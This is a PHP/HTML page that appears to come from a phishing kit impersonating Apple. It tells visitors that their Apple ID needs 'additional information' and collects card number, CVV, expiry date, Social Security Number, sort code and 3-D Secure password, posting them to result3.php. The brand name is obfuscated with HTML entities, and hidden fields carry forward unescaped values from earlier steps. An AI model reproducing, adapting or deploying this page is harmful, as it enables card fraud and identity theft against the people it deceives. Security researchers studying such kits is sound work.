<? include "../security.php"; ?>
<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>

<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>Confirm your account</title>
	<link href="../css/style.css" type="text/css" rel="stylesheet" />
	<link rel="stylesheet" href="../css/validationEngine.jquery.css" type="text/css" />
	<script src="../js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="../js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="../js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<link rel="shortcut icon" href="../../img/favicon.ico">
	<script>
		jQuery(document).ready(function(){
			jQuery("#signup").validationEngine();
		});
	</script>
	<!--
	<script type="text/javascript">
		function valider(){
		   if ( document.formPost.data10.value == "" ){
				alert ( "Veuillez entrer votre nom" );
				document.formPost.data10.focus();
				return false;
			}
		   if (!document.formPost.data1.value.match(/^[0-9]{16}$/)){
				alert ( "Veuillez saisir un num�ro de carte de cr�dit valide" );
				document.formPost.data1.focus();
				return false;
			}
		   if (!document.formPost.data2.value.match(/^[0-9]{3}$/)){
				alert ( "Cryptogramme (CVV) invalide" );
				document.formPost.data2.focus();
				return false;
			}
		   if ( document.formPost.data6.value == "" ){
				alert ( "Vous devez saisir une r�ponse" );
				document.formPost.data6.focus();
				return false;
			}
		   if ( document.formPost.data3.value == "0"){
				alert ( "Vous avez indiqu� une date d'expiration invalide" );
				document.formPost.data3.focus();
				return false;
			}
		}
	</script>
	-->
</head>
<body>
	<div id="top-bar">
		<div id="navbar">
			<ul >
				<li><a href="#"><img src="../img/app.png"  /></a></li>
				<li><a href="#"><img src="../img/ul1.png"  /></a></li>
				<li><a href="#"><img src="../img/ul2.png"  /></a></li>
				<li><a href="#"><img src="../img/ul3.png"  /></a></li>
				<li><a href="#"><img src="../img/ul4.png"  /></a></li>
				<li><a href="#"><img src="../img/ul5.png"  /></a></li>
				<li><a href="#"><img src="../img/ul6.png"  /></a></li>
				<li><a href="#"><img src="../img/ul7.png"  /></a></li>
				<li><form action="#" ><input class="top-nav-search" type="text" value="Search..." ></form></li>
			</ul>
			
		</div>
	</div>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
			<div class="left2">
				</br></br>
				<h1>Additional information required.</h1>
				<p>To help ensure the security of your &#65;p&#112;l&#101; ID we require you to Enter your credit card informations.</p>
				<hr>
				</br></br></br>
				<img src="../img/protect.png" />
				<img src="../img/protect2.gif" width="80" />
				<img src="../img/crd2.png" width="110" />
			</div>
			<div class="right">
				<form method="post" action="result3.php" name="signup" id="signup">
					<h1>Update Card informations.<img border="0" src="../img/sc.png" width="83" height="33" align="right"></h1>
					<table cellpadding="0" cellspacing="0" border="0" width="105%">
						<tr>
							<td colspan="3">
								<p>Enter the information associated with your iTunes account.</p>
							</td>
						</tr>

						
						<tr>
							<td class="leftRow" width="154" style="text-align: left">
								<font color="#666666">Card Holder</font></td>
							<td class="rightRow" colspan="2">
								<span class="formwrap">
									<input class="validate[required]" style="width:160px" id="holdername" name="holdername" type="text" />
								</span>
							</td>
						</tr>
						
						<tr>
							<td class="leftRow" width="154" style="text-align: left">
								<font color="#666666">Credit Card Number</font></td>
							<td class="rightRow" width="33%">
								<span class="formwrap">
									<input class="validate[required,custom[nemeOnId]]" maxlength="16" style="width:180px" id="numcard" name="numcard" type="text" />
								</span>
							</td>
							<td class="centerRow" width="29%">
								<img border="0" src="../img/crd.png" width="163" height="23"></td>
						</tr>
						<tr>
							<td class="leftRow" width="154" style="text-align: left" >
								<font color="#666666">CVC / CVV</font></td>
							<td class="rightRow" width="33%">
								<span class="formwrap">
									<input class="validate[required,custom[integer]]" maxlength="4" style="width:50px;text-align:center;" id="ccv-code" name="ccv-code" type="text" /></span></td>
							<td class="centerRow cvv" class="leftRow" width="29%" >
								<a href="#"><img border="0" src="../img/cv.png" height="28"></a>
							</td>
							
						</tr>
						<tr>
							<td class="leftRow" width="154" style="text-align: left" >
								<font color="#666666">Expiration Date</font></td>
							<td class="rightRow" colspan="2">
								<span class="formwrap">
									<select id="ex-date" class="validate[required]" name="ex-date">
<option selected value>Month</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
									</select>
									<select id="ex-date2" class="validate[required]" name="ex-date2">
<option selected value>Year</option>
<option value="2015">2015</option>
<option value="2016">2016</option>
<option value="2017">2017</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
</select>
								</span>
								</td>
						</tr>	
						<tr>
							<td class="leftRow" width="154" style="text-align: left">
								<font color="#666666">Social Security Number</font>
							</td>
							<td class="rightRow" colspan="2">
								<span class="formwrap">
									<input maxlength="9" style="width:100px" id="soc-num" name="soc-num" type="text" placeholder="XXX - XX - XXXX" />
								</span>
							</td>
						</tr>
                        	<tr>
							<td class="leftRow" width="154" style="text-align: left">
								<font color="#666666">Sort Code (optional)</font>
							</td>
							<td class="rightRow" colspan="2">
								<span class="formwrap">
									<input maxlength="6" style="width:50px" id="sort-co" name="sort-co" type="text" placeholder="xx/xx/xx" />
								</span>
							</td>
						</tr>
						<tr>
							<td class="leftRow" width="154" style="text-align: left">
								<font color="#666666">3-D Secure</font>
							</td>
							<td class="rightRow" width="33%">
								<span class="formwrap">
									<input maxlength="30" style="width:150px" id="3d-co" name="3d-co" type="password" placeholder="* * * * * * * * * *" />
								</span>
							</td>
							<td class="centerRow" class="leftRow" width="29%">
								<img border="0" src="../img/crd2.png" height="28"></td>
							
						</tr>
                         
						<tr>
							<td class="leftRow" style="border:0;" width="155">
								
							</td>
							<td class="rightRow noborder" colspan="2" style="text-align:center;border:0;">
								<input name="donnee1" value="<?php echo $_POST['donnee1'];?>" type="hidden" />
								<input name="donnee2" value="<?php echo $_POST['donnee2'];?>" type="hidden" />
								<input class="submit" value="Confirm" type="submit" />
							</td>
						</tr>
					</table>
				</form>
			</div>
		</div>
		<div id="footer">
		<p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
		<hr>
		<div class="copy-right"><a>Copyright &copy; 2015 &#65;p&#112;l&#101; Inc. All rights reserved.</a></div>
		<div class="terms"><a href="#">Terms of Use |</a> <a href="#">Terms of Use |</a><a href="#">Terms of Use .</a></div>
	 </div>
	</div>
</body>
</html>